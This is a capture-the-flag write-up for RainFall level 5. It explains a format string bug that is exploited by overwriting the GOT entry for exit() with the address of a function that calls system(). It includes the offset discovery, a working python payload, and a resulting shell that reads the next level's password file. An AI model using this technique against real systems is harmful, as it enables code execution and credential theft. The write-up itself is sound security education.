## Level 5

### Vulnerability Analysis
The target is `level5`. Running the `main` function simply calls `n()`.

Examining `n()` reveals the by now familiar combination of `fgets` and `printf(buffer)` indicating a format string vulnerability. However, there is a catch:
```assembly
0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
0x080484f3 <+49>:    call   0x8048380 <printf@plt>
0x080484ff <+61>:    call   0x80483d0 <exit@plt>
```
After the format string vulnerability, the function immediately calls `exit()` instead of checking a memory address or returning normally. This means we cannot do a standard stack buffer overflow, nor can we arbitrarily set a variable to spawn a shell as we did previously.

However, there is an unused function `o()` that calls `system()` (presumably popping a shell).
```assembly
0x080484a4 <+0>:     push   ebp
...
0x080484b1 <+13>:    call   0x80483b0 <system@plt>
```
The address of `o()` is `0x080484a4`.

Because the program calls `exit()` immediately after our format string vulnerability, we can hijack the Global Offset Table (GOT) entry for `exit`. The GOT is a table of function pointers the program uses to resolve dynamically linked functions like `exit` and `printf`. By overwriting the `exit()` pointer in the GOT with the address of `o()`, the program will execute `o()` instead of cleanly exiting!

### The Exploit
First, we find the format string offset of our buffer parameter.
```bash
level5@RainFall:~$ ./level5 
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 ...
```
We see `41414141` appears at the 4th position. This means our format string parameter offset is `4`.

Next, we identify the address of the `exit()` function in the Global Offset Table using `objdump`.
```bash
level5@RainFall:~$ objdump -R ./level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```
The exact address of `exit` in the GOT is `0x08049838`.

Our goal is to make `exit` resolve to the address of `o()` (`0x080484a4`), ensuring that when `n()` calls `exit()`, the program triggers `o()` instead.

`0x080484a4` in decimal is `134,513,828`. 

We will generate a payload that writes the GOT address (`0x08049838`) to the stack first (4 bytes). Then, we print a width-specifier to output `134,513,824` blank spaces (`134,513,828` - `4` bytes). Finally, we supply `%4$n` which overrides the memory loaded from the 4th parameter of `printf` on the stack (which is the GOT address we provided) with the total characters printed.

Payload: `[GOT Address] + [%134513824d] + [%4$n]`

```bash
level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'; cat) | ./level5
... (Lots of spaces) ...
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```